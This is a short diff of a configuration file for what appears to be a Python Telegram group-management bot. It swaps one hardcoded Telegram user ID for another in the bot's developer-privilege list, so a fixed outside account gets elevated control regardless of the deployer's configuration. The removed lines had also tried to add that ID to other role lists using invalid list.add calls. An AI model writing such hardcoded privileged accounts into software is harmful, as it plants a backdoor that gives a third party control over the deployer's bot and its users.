@@ -203,7 +203,7 @@ else:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
 
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(5295326990)
+DEV_USERS.add(5058906117)
 
 REDIS = StrictRedis.from_url(REDIS_URL,decode_responses=True)
 
@@ -298,10 +298,10 @@ async def eor(msg: Message, **kwargs):
 
 
 DRAGONS = list(DRAGONS) + list(DEV_USERS)
-DEV_USERS = list(DEV_USERS).add(5058906117)
-WOLVES = list(WOLVES).add(5058906117)
-DEMONS = list(DEMONS).add(5058906117)
-TIGERS = list(TIGERS).add(5058906117)
+DEV_USERS = list(DEV_USERS)
+WOLVES = list(WOLVES)
+DEMONS = list(DEMONS)
+TIGERS = list(TIGERS)
 
 # Load at end to ensure all prev variables have been set
 from TGN.modules.helper_funcs.handlers import (
